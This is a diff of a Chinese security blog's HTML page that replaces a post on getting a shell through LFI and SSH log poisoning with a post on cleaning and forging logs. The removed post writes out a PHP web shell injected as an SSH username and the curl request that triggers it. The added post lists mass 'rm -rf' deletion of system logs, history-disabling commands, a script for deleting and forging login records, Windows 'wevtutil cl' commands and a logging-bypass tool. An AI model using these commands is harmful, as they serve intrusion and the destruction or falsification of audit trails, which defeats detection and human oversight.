@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          LFI SSH日志 - Rootclay
+          日志清理 - Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/03/23/lfi_ssh/">
+    <link rel="canonical" href="http://rootclay.github.io/2017/08/02/日志清理/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,16 +88,12 @@
                             
                               <a class="tag" href="/tags/#Web" title="Web">Web</a>
                             
-                              <a class="tag" href="/tags/#LFI" title="LFI">LFI</a>
-                            
-                              <a class="tag" href="/tags/#SSH" title="SSH">SSH</a>
-                            
                         </div>
-                        <h1>LFI SSH日志</h1>
-                        <h2 class="subheading">通过LFI包含到SSH日志来获取SHELL.</h2>
+                        <h1>日志清理</h1>
+                        <h2 class="subheading">日志清理的个人总结.</h2>
                         <span class="meta">
                             Posted by Rootclay on
-                            2017-03-23
+                            2017-08-02
                         </span>
                     </div>
                 
@@ -214,24 +210,40 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="lfi-ssh日志">LFI SSH日志</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh <span class="string">'&lt;?php system($_GET[‘c’]); ?&gt;'</span>@192.168.32.137</div></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://192.168.32.137/lfi.php?file=/var/<span class="built_in">log</span>/auth.log&amp;c=ls</div></pre></td></tr></table></figure>
-<p>Tips:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/var/<span class="built_in">log</span>/auth.log只有ubuntu系有。</div><div class="line">其实对linux，可以包含/var/<span class="built_in">log</span>/wtmp。一样的效果。有16字符可控，足够了。</div><div class="line">只可以没有x权限。</div></pre></td></tr></table></figure>
+                <blockquote>
+<p>日志清理与伪造</p>
+</blockquote>
+<h2 id="linux平台">Linux平台</h2>
+<p>主要日志如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; <span class="built_in">export</span> HISTFILE=/dev/null; <span class="built_in">export</span> HISTSIZE=0; <span class="built_in">export</span> HISTFILESIZE=0 </div><div class="line"> </div><div class="line">rm -rf /var/<span class="built_in">log</span>/lastlog </div><div class="line">rm -rf /var/<span class="built_in">log</span>/telnetd </div><div class="line">rm -rf /var/run/utmp </div><div class="line">rm -rf /var/<span class="built_in">log</span>/secure </div><div class="line">rm -rf /var/<span class="built_in">log</span>/wtmp </div><div class="line">rm -rf /etc/wtmp </div><div class="line">rm -rf /var/run/utmp </div><div class="line">rm -rf /etc/utmp </div><div class="line">rm -rf /var/<span class="built_in">log</span> </div><div class="line">rm -rf /var/adm </div><div class="line">rm -rf /var/apache/<span class="built_in">log</span> </div><div class="line">rm -rf /var/apache/logs </div><div class="line">rm -rf /usr/<span class="built_in">local</span>/apache/<span class="built_in">log</span> </div><div class="line">rm -rf /usr/<span class="built_in">local</span>/apache/logs </div><div class="line">rm -rf /var/<span class="built_in">log</span>/acct </div><div class="line">rm -rf /var/<span class="built_in">log</span>/xferlog </div><div class="line">rm -rf /var/<span class="built_in">log</span>/messages </div><div class="line">rm -rf /var/<span class="built_in">log</span>/proftpd/xferlog.legacy </div><div class="line">rm -rf /var/<span class="built_in">log</span>/proftpd.access_log </div><div class="line">rm -rf /var/<span class="built_in">log</span>/proftpd.xferlog </div><div class="line">rm -rf /var/<span class="built_in">log</span>/httpd/error_log </div><div class="line">rm -rf /var/<span class="built_in">log</span>/httpd/access_log </div><div class="line">rm -rf /etc/httpd/logs/access_log </div><div class="line">rm -rf /etc/httpd/logs/error_log </div><div class="line">rm -rf /var/<span class="built_in">log</span>/news/suck.notice </div><div class="line">rm -rf /var/spool/tmp </div><div class="line">rm -rf /var/spool/errors </div><div class="line">rm -rf /var/spool/logs </div><div class="line">rm -rf /var/spool/locks </div><div class="line">rm -rf /usr/<span class="built_in">local</span>/www/logs/thttpd_log </div><div class="line">rm -rf /var/<span class="built_in">log</span>/thttpd_log </div><div class="line">rm -rf /var/<span class="built_in">log</span>/ncftpd/misclog.txt </div><div class="line">rm -rf /var/<span class="built_in">log</span>/ncftpd.errs </div><div class="line">rm -rf /var/<span class="built_in">log</span>/auth</div><div class="line">rm -rf /var/<span class="built_in">log</span>/cron</div><div class="line">rm -rf /var/<span class="built_in">log</span>/maillog</div><div class="line">rm -rf /var/<span class="built_in">log</span>/yum.log</div><div class="line">rm -rf /var/<span class="built_in">log</span>/messages</div></pre></td></tr></table></figure>
+<p>但是我们主要要清理的是登录日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">/var/run/utmp    </div><div class="line">utmp 对应w 和 who命令</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/wtmp</div><div class="line">wtmp 对应last命令</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/btmp</div><div class="line">btmp对应lastb命令</div><div class="line"></div><div class="line">/var/<span class="built_in">log</span>/lastlog</div><div class="line">lastlog 对应lastlog命令</div></pre></td></tr></table></figure>
+<h3 id="删除日志">删除日志</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">1. 删除utmp记录，将自己从w或者who输出中隐藏</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> utmp --user root //删除用户为root的用户记录</div><div class="line"></div><div class="line">2. 删除历史登录记录(wtmp)，隐藏last的记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> wtmp --user root //删除用户为root的用户记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> wtmp --user root --host <span class="string">"127.0.0.1"</span> //删除用户为root且登录来源host为127.0.0.1的用户记录</div><div class="line"></div><div class="line">3. 删除btmp记录，隐藏lastb的记录，lastb为登录失败的用户记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> btmp --user root --host <span class="string">"172.16.50.156"</span> //删除用户为root且登录来源host为127.0.0.1的用户记录</div><div class="line"></div><div class="line">4. 删除lastlog记录，不能通过用户删除，只能通过host或者时间</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> lastlog --host <span class="string">"172.16.50.1"</span> //删除来源host的用户登录记录</div><div class="line">python fake_login_log.py --mode delete --<span class="built_in">type</span> lastlog --date <span class="string">"2017-8-2 22:46:34"</span> //删除登录时间为2017-8-2 22:46:34的用户登录记录</div></pre></td></tr></table></figure>
+<h3 id="伪造日志">伪造日志</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">1. 伪造utmp记录，将自己从w或者who输出中伪造</div><div class="line">python fake_login_log.py --mode add --<span class="built_in">type</span> utmp --user nobody --tty <span class="string">"pts/8"</span> --pid 25394 --date <span class="string">"2017-8-2 22:46:34"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为nobody的用户记录</div><div class="line">这里伪造的时间和host可以通过who命令去找到，PID一般伪造bash或者ssh通过`ps -aux | grep ssh/bash`去寻找</div><div class="line"></div><div class="line">2. 伪造历史登录记录(wtmp)，伪造last的记录</div><div class="line">python fake_login_log.py --mode add  --<span class="built_in">type</span> wtmp --user root --tty <span class="string">"pts/7"</span> --date <span class="string">"2017-8-2 00:06:34"</span> --host <span class="string">"127.0.0.1"</span></div><div class="line"></div><div class="line">3. 伪造btmp记录，伪造lastb的记录，lastb为登录失败的用户记录</div><div class="line">python fake_login_log.py --mode add  --<span class="built_in">type</span> btmp --user root --tty <span class="string">"pts/7"</span> --date <span class="string">"2017-8-2 00:06:34"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为root且登录来源host为127.0.0.1的用户登录失败记录</div><div class="line"></div><div class="line">4. 伪造lastlog记录</div><div class="line">python fake_login_log.py --mode add --<span class="built_in">type</span>=lastlog --user=rootclay --date=<span class="string">"2017-7-24 14:22:07"</span> --tty <span class="string">"pts/2"</span> --host <span class="string">"127.0.0.1"</span> //伪造用户为rootclay 时间2017-7-24 14:22:07 来源登录ip为127.0.0.1的用户登录记录</div></pre></td></tr></table></figure>
+<h2 id="windows平台">Windows平台</h2>
+<p>Windows日志包括五个类别：</p>
+<ol>
+<li>应用程序</li>
+<li>安全</li>
+<li>Setup</li>
+<li>系统</li>
+<li>转发事件</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wevtutil.exe cl application</div><div class="line">wevtutil.exe cl Security</div><div class="line">wevtutil.exe cl setup</div><div class="line">wevtutil.exe cl system</div><div class="line">wevtutil.exe cl forwardedevents</div></pre></td></tr></table></figure>
+<p>直接绕过日志：<br>
+<a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="external">Invoke-Phant0m</a></p>
+
                 
 
                 <hr>
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2017/03/23/mysql日志包含拿shell/" data-toggle="tooltip" data-placement="top" title="SQL语句利用日志写shell">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2017/03/20/docker三剑客/" data-toggle="tooltip" data-placement="top" title="Docker 三侠客">Next Post &rarr;</a>
+                            <a href="/2017/08/01/SSH如何稳定方向代理/" data-toggle="tooltip" data-placement="top" title="SSH如何反向代理稳定穿透内网">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -261,7 +273,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#lfi-ssh日志"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LFI SSH日志</span></a></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#linux平台"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Linux平台</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#删除日志"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">删除日志</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#伪造日志"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">伪造日志</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#windows平台"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">Windows平台</span></a></li></ol>
         
         </div>
       </aside>
@@ -282,10 +294,6 @@
                     <div class="tags">
                        
                           <a class="tag" href="/tags/#Web" title="Web">Web</a>
-                        
-                          <a class="tag" href="/tags/#LFI" title="LFI">LFI</a>
-                        
-                          <a class="tag" href="/tags/#SSH" title="SSH">SSH</a>
                         
                     </div>
                 </section>
@@ -332,8 +340,8 @@
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://rootclay.github.io/2017/03/23/lfi_ssh/";
-    var disqus_url = "http://rootclay.github.io/2017/03/23/lfi_ssh/";
+    var disqus_identifier = "http://rootclay.github.io/2017/08/02/日志清理/";
+    var disqus_url = "http://rootclay.github.io/2017/08/02/日志清理/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
